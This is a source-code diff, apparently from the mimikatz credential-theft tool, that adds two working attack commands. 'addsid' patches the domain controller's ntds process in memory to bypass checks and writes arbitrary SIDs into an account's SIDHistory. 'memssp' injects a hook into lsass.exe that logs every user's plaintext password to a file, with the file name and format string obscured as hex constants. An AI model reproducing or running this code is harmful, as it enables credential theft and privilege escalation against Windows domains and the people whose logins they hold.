@@ -12,6 +12,10 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_ncroutemon,L"ncroutemon",	L"Juniper Network Connect (without route monitoring)"},
 	{kuhl_m_misc_detours,	L"detours",		L"[experimental] Try to enumerate all modules with Detours-like hooks"},
 	{kuhl_m_misc_wifi,		L"wifi",		NULL},
+#ifdef _M_X64
+	{kuhl_m_misc_addsid,	L"addsid",		NULL},
+#endif
+	{kuhl_m_misc_memssp,	L"memssp",		NULL},
 };
 const KUHL_M kuhl_m_misc = {
 	L"misc",	L"Miscellaneous module",	NULL,
@@ -41,7 +45,6 @@ NTSTATUS kuhl_m_misc_init()
 		WlanGetProfileList = (PWLANGETPROFILELIST) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanGetProfileList");
 		WlanGetProfile = (PWLANGETPROFILE) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanGetProfile");
 		WlanFreeMemory = (PWLANFREEMEMORY) GetProcAddress(kuhl_m_misc_hWlanLib, "WlanFreeMemory");
-
 
 		if(!(WlanOpenHandle && WlanCloseHandle && WlanEnumInterfaces && WlanGetProfileList && WlanGetProfile && WlanFreeMemory))
 			status = STATUS_NOT_FOUND;
@@ -224,8 +227,7 @@ BOOL CALLBACK kuhl_m_misc_detours_callback_process(PSYSTEM_PROCESS_INFORMATION p
 			}
 			CloseHandle(hProcess);
 		}
-		else
-			PRINT_ERROR_AUTO(L"OpenProcess");
+		else PRINT_ERROR_AUTO(L"OpenProcess");
 	}
 	return TRUE;
 }
@@ -322,5 +324,273 @@ NTSTATUS kuhl_m_misc_wifi(int argc, wchar_t * argv[])
 			WlanFreeMemory(pInterfaceList);
 		}
 	}
+	return STATUS_SUCCESS;
+}
+#ifdef _M_X64
+BYTE PTRN_JMP[]			= {0xeb};
+BYTE PTRN_6NOP[]		= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
+
+BYTE PTRN_WN81_0[]		= {0xb8, 0x56, 0x21, 0x00, 0x00, 0x41};
+BYTE PTRN_WN81_1[]		= {0xc2, 0x05, 0x1a, 0x01, 0xe9};
+BYTE PTRN_WN81_2[]		= {0x48, 0x8b, 0xd7, 0x8b, 0x8c, 0x24, 0xc0, 0x00, 0x00, 0x00};
+BYTE PTRN_WN81_3[]		= {0xff, 0xff, 0x4c, 0x8d, 0x8c, 0x24, 0x60, 0x01, 0x00, 0x00};
+BYTE PTRN_WN81_4[]		= {0x49, 0x8b, 0x48, 0x18, 0x48, 0x8b, 0x84, 0x24, 0x00, 0x04, 0x00, 0x00};
+BYTE PTRN_WN81_5[]		= {0xc7, 0x44, 0x24, 0x74, 0x1c, 0x07, 0x1a, 0x01, 0xe9};
+BYTE PTRN_WN81_6[]		= {0x33, 0xd2, 0x48, 0x8d, 0x8c, 0x24, 0x10, 0x04, 0x00, 0x00, 0xff, 0x15};
+BYTE PTRN_WN81_7[]		= {0x8b, 0x84, 0x24, 0x98, 0x01, 0x00, 0x00, 0x3d, 0xe8, 0x03, 0x00, 0x00, 0x73};
+
+KULL_M_PATCH_MULTIPLE w2k12r2[] = {
+	{{sizeof(PTRN_WN81_0), PTRN_WN81_0}, {sizeof(PTRN_JMP),  PTRN_JMP},	-2,		{NULL, NULL}, 0, {NULL, NULL}},
+	{{sizeof(PTRN_WN81_1), PTRN_WN81_1}, {sizeof(PTRN_JMP),  PTRN_JMP},	-13,	{NULL, NULL}, 0, {NULL, NULL}},
+	{{sizeof(PTRN_WN81_2), PTRN_WN81_2}, {sizeof(PTRN_6NOP), PTRN_6NOP},-11,	{NULL, NULL}, 0, {NULL, NULL}},
+	{{sizeof(PTRN_WN81_3), PTRN_WN81_3}, {sizeof(PTRN_6NOP), PTRN_6NOP},-4,		{NULL, NULL}, 0, {NULL, NULL}},
+	{{sizeof(PTRN_WN81_4), PTRN_WN81_4}, {sizeof(PTRN_JMP),  PTRN_JMP},	-2,		{NULL, NULL}, 0, {NULL, NULL}},
+	{{sizeof(PTRN_WN81_5), PTRN_WN81_5}, {sizeof(PTRN_JMP),  PTRN_JMP},	-16,	{NULL, NULL}, 0, {NULL, NULL}},
+	{{sizeof(PTRN_WN81_6), PTRN_WN81_6}, {sizeof(PTRN_6NOP), PTRN_6NOP},-6,		{NULL, NULL}, 0, {NULL, NULL}},
+	{{sizeof(PTRN_WN81_7), PTRN_WN81_7}, {sizeof(PTRN_JMP),  PTRN_JMP},	 12,	{NULL, NULL}, 0, {NULL, NULL}},
+};
+NTSTATUS kuhl_m_misc_addsid(int argc, wchar_t * argv[])
+{
+	SERVICE_STATUS_PROCESS sNtds;
+	HANDLE hProcess, hDs;
+	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iNtds;
+	DWORD i, err;
+
+	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_MEMORY_ADDRESS sAddress = {NULL, &hLocalMemory}, aProcess = {NULL, NULL};
+	KULL_M_MEMORY_SEARCH sSearch;
+	BOOL littleSuccess = TRUE;
+	PPOLICY_DNS_DOMAIN_INFO pDnsInfo;
+
+	if((argc > 1) && (MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_BLUE))
+	{
+		if(kull_m_net_getCurrentDomainInfo(&pDnsInfo))
+		{
+			err = DsBindW(NULL, NULL, &hDs);
+			if(err == ERROR_SUCCESS)
+			{
+				if(kull_m_service_getUniqueForName(L"ntds", &sNtds))
+				{
+					if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, sNtds.dwProcessId))
+					{
+						if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aProcess.hMemory))
+						{
+							if(kull_m_process_getVeryBasicModuleInformationsForName(aProcess.hMemory, L"ntdsai.dll", &iNtds))
+							{
+								sSearch.kull_m_memoryRange.kull_m_memoryAdress = iNtds.DllBase;
+								sSearch.kull_m_memoryRange.size = iNtds.SizeOfImage;
+
+								for(i = 0; (i < ARRAYSIZE(w2k12r2)) && littleSuccess; i++)
+								{
+									littleSuccess = FALSE;
+									w2k12r2[i].LocalBackup.hMemory = &hLocalMemory;
+									w2k12r2[i].LocalBackup.address = NULL;
+									w2k12r2[i].AdressOfPatch.hMemory = aProcess.hMemory;
+									w2k12r2[i].AdressOfPatch.address = NULL;
+									w2k12r2[i].OldProtect = 0;
+
+									sAddress.address = w2k12r2[i].Search.Pattern;
+									if(kull_m_memory_search(&sAddress, w2k12r2[i].Search.Length, &sSearch, TRUE))
+									{
+										if(w2k12r2[i].LocalBackup.address = LocalAlloc(LPTR, w2k12r2[i].Patch.Length))
+										{
+											w2k12r2[i].AdressOfPatch.address = (PBYTE) sSearch.result + w2k12r2[i].Offset;
+											if(!(littleSuccess = kull_m_memory_copy(&w2k12r2[i].LocalBackup, &w2k12r2[i].AdressOfPatch, w2k12r2[i].Patch.Length)))
+											{
+												PRINT_ERROR_AUTO(L"kull_m_memory_copy (backup)");
+												LocalFree(w2k12r2[i].LocalBackup.address);
+												w2k12r2[i].LocalBackup.address = NULL;
+											}
+										}
+									}
+									else PRINT_ERROR_AUTO(L"kull_m_memory_search");
+								}
+
+								if(littleSuccess)
+								{
+									for(i = 0; (i < ARRAYSIZE(w2k12r2)) && littleSuccess; i++)
+									{
+										littleSuccess = FALSE;
+
+										if(kull_m_memory_protect(&w2k12r2[i].AdressOfPatch, w2k12r2[i].Patch.Length, PAGE_EXECUTE_READWRITE, &w2k12r2[i].OldProtect))
+										{
+											sAddress.address = w2k12r2[i].Patch.Pattern;
+											if(!(littleSuccess = kull_m_memory_copy(&w2k12r2[i].AdressOfPatch, &sAddress, w2k12r2[i].Patch.Length)))
+												PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+										}
+										else PRINT_ERROR_AUTO(L"kull_m_memory_protect");
+									}
+								}
+
+								if(littleSuccess)
+								{
+									kprintf(L"SIDHistory for \'%s\'\n", argv[0]);
+									for(i = 1; i < (DWORD) argc; i++)
+									{
+										kprintf(L" * %s\t", argv[i]);
+										err = DsAddSidHistoryW(hDs, 0, pDnsInfo->DnsDomainName.Buffer, argv[i], NULL, NULL, pDnsInfo->DnsDomainName.Buffer, argv[0]);
+										if(err == NO_ERROR)
+											kprintf(L"OK\n");
+										else PRINT_ERROR(L"DsAddSidHistory: 0x%08x (%u)!\n", err, err);
+									}
+								}
+
+								for(i = 0; i < ARRAYSIZE(w2k12r2); i++)
+								{
+									if(w2k12r2[i].LocalBackup.address)
+									{
+										if(!kull_m_memory_copy(&w2k12r2[i].AdressOfPatch, &w2k12r2[i].LocalBackup, w2k12r2[i].Patch.Length))
+											PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+										LocalFree(w2k12r2[i].LocalBackup.address);
+									}
+									if(w2k12r2[i].OldProtect)
+										kull_m_memory_protect(&w2k12r2[i].AdressOfPatch, w2k12r2[i].Patch.Length, w2k12r2[i].OldProtect, &w2k12r2[i].OldProtect);
+								}
+							}
+							kull_m_memory_close(aProcess.hMemory);
+						}
+						CloseHandle(hProcess);
+					}
+				}
+				err = DsUnBindW(&hDs);
+			}
+			else PRINT_ERROR(L"DsBind: %08x (%u)!\n", err, err);
+			LsaFreeMemory(pDnsInfo);
+		}
+	} else PRINT_ERROR(L"It requires at least 2 args and 2012r2\n");
+	return STATUS_SUCCESS;
+}
+#endif
+typedef NTSTATUS (NTAPI * PSPACCEPTCREDENTIALS)(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials);
+typedef FILE * (__cdecl * PFOPEN)(__in_z const char * _Filename, __in_z const char * _Mode);
+typedef int (__cdecl * PFWPRINTF)(__inout FILE * _File, __in_z __format_string const wchar_t * _Format, ...);
+typedef int (__cdecl * PFCLOSE)(__inout FILE * _File);
+#pragma optimize("", off)
+NTSTATUS NTAPI misc_msv1_0_SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
+{
+	FILE * logfile;
+	DWORD filename[] = {0x696d696d, 0x2e61736c, 0x00676f6c},
+		append = 0x00000061,
+		format[] = {0x0025005b, 0x00380030, 0x003a0078, 0x00300025, 0x00780038, 0x0020005d, 0x00770025, 0x005c005a, 0x00770025, 0x0009005a, 0x00770025, 0x000a005a, 0x00000000};
+
+	if(logfile = ((PFOPEN) 0x4141414141414141)((PCHAR) filename, (PCHAR) &append))
+	{	
+		((PFWPRINTF) 0x4242424242424242)(logfile, (PWCHAR) format, PrimaryCredentials->LogonId.HighPart, PrimaryCredentials->LogonId.LowPart, &PrimaryCredentials->DomainName, &PrimaryCredentials->DownlevelName, &PrimaryCredentials->Password);
+		((PFCLOSE) 0x4343434343434343)(logfile);
+	}
+	return ((PSPACCEPTCREDENTIALS) 0x4444444444444444)(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
+}
+DWORD misc_msv1_0_SpAcceptCredentials_end(){return 'mssp';}
+#pragma optimize("", on)
+
+#ifdef _M_X64
+BYTE INSTR_JMP[]= {0xff, 0x25, 0x00, 0x00, 0x00, 0x00}; // need 14
+BYTE PTRN_WIN5_MSV1_0[]	= {0x49, 0x8b, 0xd0, 0x4d, 0x8b, 0xc1, 0xeb, 0x08, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x89, 0x4c, 0x24, 0x08}; // damn short jump!
+BYTE PTRN_WI6X_MSV1_0[]	= {0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48};
+BYTE PTRN_WI81_MSV1_0[]	= {0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xf1, 0x48};
+KULL_M_PATCH_GENERIC MSV1_0AcceptReferences[] = {
+	{KULL_M_WIN_MIN_BUILD_2K3,	{sizeof(PTRN_WIN5_MSV1_0),	PTRN_WIN5_MSV1_0},	{0, NULL}, {  0, sizeof(PTRN_WIN5_MSV1_0)}},
+	{KULL_M_WIN_MIN_BUILD_VISTA,{sizeof(PTRN_WI6X_MSV1_0),	PTRN_WI6X_MSV1_0},	{0, NULL}, {-15, 15}},
+	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-17, 15}},
+};
+#elif defined _M_IX86
+BYTE INSTR_JMP[]= {0xe9}; // need 5
+BYTE PTRN_WIN5_MSV1_0[] = {0x8b, 0xff, 0x55, 0x8b, 0xec, 0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8};
+BYTE PTRN_WI6X_MSV1_0[]	= {0xff, 0x75, 0x14, 0xff, 0x75, 0x10, 0xff, 0x75, 0x08, 0xe8, 0x24, 0x00, 0x00, 0x00};
+BYTE PTRN_WI80_MSV1_0[] = {0xff, 0x75, 0x08, 0x8b, 0x4d, 0x14, 0x8b, 0x55, 0x10, 0xe8};
+BYTE PTRN_WI81_MSV1_0[]	= {0xff, 0x75, 0x14, 0x8B, 0x55, 0x10, 0x8B, 0x4D, 0x08, 0xE8};
+
+KULL_M_PATCH_GENERIC MSV1_0AcceptReferences[] = {
+	{KULL_M_WIN_MIN_BUILD_XP,	{sizeof(PTRN_WIN5_MSV1_0),	PTRN_WIN5_MSV1_0},	{0, NULL}, {  0, 5}},
+	{KULL_M_WIN_MIN_BUILD_VISTA,{sizeof(PTRN_WI6X_MSV1_0),	PTRN_WI6X_MSV1_0},	{0, NULL}, {-41, 5}},
+	{KULL_M_WIN_MIN_BUILD_8,	{sizeof(PTRN_WI80_MSV1_0),	PTRN_WI80_MSV1_0},	{0, NULL}, {-43, 5}},
+	{KULL_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WI81_MSV1_0),	PTRN_WI81_MSV1_0},	{0, NULL}, {-39, 5}},
+};
+#endif
+PCWCHAR szMsvCrt = L"msvcrt.dll";
+NTSTATUS kuhl_m_misc_memssp(int argc, wchar_t * argv[])
+{
+	HANDLE hProcess;
+	DWORD processId;
+	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_MEMORY_ADDRESS aLsass, aLocal = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_SEARCH sSearch;
+	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iMSV;
+	PKULL_M_PATCH_GENERIC pGeneric;
+	REMOTE_EXT extensions[] = {
+		{szMsvCrt,	"fopen",	(PVOID) 0x4141414141414141, NULL},
+		{szMsvCrt,	"fwprintf",	(PVOID) 0x4242424242424242, NULL},
+		{szMsvCrt,	"fclose",	(PVOID) 0x4343434343434343, NULL},
+		{NULL,		NULL,		(PVOID) 0x4444444444444444, NULL},
+	};
+	MULTIPLE_REMOTE_EXT extForCb = {ARRAYSIZE(extensions), extensions};
+
+	DWORD trampoSize;
+	if(kull_m_process_getProcessIdForName(L"lsass.exe", &processId))
+	{
+		if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, processId))
+		{
+			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &aLsass.hMemory))
+			{
+				if(kull_m_process_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"msv1_0.dll", &iMSV))
+				{
+					sSearch.kull_m_memoryRange.kull_m_memoryAdress = iMSV.DllBase;
+					sSearch.kull_m_memoryRange.size = iMSV.SizeOfImage;
+					if(pGeneric = kull_m_patch_getGenericFromBuild(MSV1_0AcceptReferences, ARRAYSIZE(MSV1_0AcceptReferences), MIMIKATZ_NT_BUILD_NUMBER))
+					{
+						aLocal.address = pGeneric->Search.Pattern;
+						if(kull_m_memory_search(&aLocal, pGeneric->Search.Length, &sSearch, TRUE))
+						{
+							trampoSize = pGeneric->Offsets.off1 + sizeof(INSTR_JMP) + sizeof(PVOID);
+							if(aLocal.address = LocalAlloc(LPTR, trampoSize))
+							{
+								sSearch.result = (PBYTE) sSearch.result + pGeneric->Offsets.off0;
+								aLsass.address = sSearch.result;
+								if(kull_m_memory_copy(&aLocal, &aLsass, pGeneric->Offsets.off1))
+								{
+									RtlCopyMemory((PBYTE) aLocal.address + pGeneric->Offsets.off1, INSTR_JMP, sizeof(INSTR_JMP));
+									if(kull_m_memory_alloc(&aLsass, trampoSize, PAGE_EXECUTE_READWRITE))
+									{
+									#ifdef _M_X64
+										*(PVOID *)((PBYTE) aLocal.address + pGeneric->Offsets.off1 + sizeof(INSTR_JMP)) = (PBYTE) sSearch.result + pGeneric->Offsets.off1;
+									#elif defined _M_IX86
+										*(LONG *)((PBYTE) aLocal.address + pGeneric->Offsets.off1 + sizeof(INSTR_JMP)) = (PBYTE) sSearch.result - ((PBYTE) aLsass.address + sizeof(INSTR_JMP) + sizeof(LONG));
+									#endif
+										extensions[3].Pointer = aLsass.address;
+										if(kull_m_memory_copy(&aLsass, &aLocal, trampoSize))
+										{
+											if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(aLsass.hMemory, misc_msv1_0_SpAcceptCredentials, (DWORD) ((PBYTE) misc_msv1_0_SpAcceptCredentials_end - (PBYTE) misc_msv1_0_SpAcceptCredentials), &extForCb, &aLsass))
+											{
+												RtlCopyMemory((PBYTE) aLocal.address, INSTR_JMP, sizeof(INSTR_JMP));
+											#ifdef _M_X64
+												*(PVOID *)((PBYTE) aLocal.address + sizeof(INSTR_JMP)) = aLsass.address;
+											#elif defined _M_IX86
+												*(LONG *)((PBYTE) aLocal.address + sizeof(INSTR_JMP)) = (PBYTE) aLsass.address - ((PBYTE) sSearch.result + sizeof(INSTR_JMP) + sizeof(LONG));
+											#endif
+												aLsass.address = sSearch.result;
+												if(kull_m_memory_copy(&aLsass, &aLocal, pGeneric->Offsets.off1))
+													kprintf(L"Injected =)\n");
+												else PRINT_ERROR_AUTO(L"kull_m_memory_copy - Trampoline n0");
+											}
+											else PRINT_ERROR_AUTO(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace");
+										}
+										else PRINT_ERROR_AUTO(L"kull_m_memory_copy - Trampoline n1");
+									}
+								}
+								else PRINT_ERROR_AUTO(L"kull_m_memory_copy - real asm");
+								LocalFree(aLocal.address);
+							}
+						}
+						else PRINT_ERROR_AUTO(L"kull_m_memory_search");
+					}
+				}
+				kull_m_memory_close(aLsass.hMemory);
+			}
+			CloseHandle(hProcess);
+		}
+		else PRINT_ERROR_AUTO(L"OpenProcess");
+	}
+	else PRINT_ERROR_AUTO(L"kull_m_process_getProcessIdForName");
+
 	return STATUS_SUCCESS;
 }
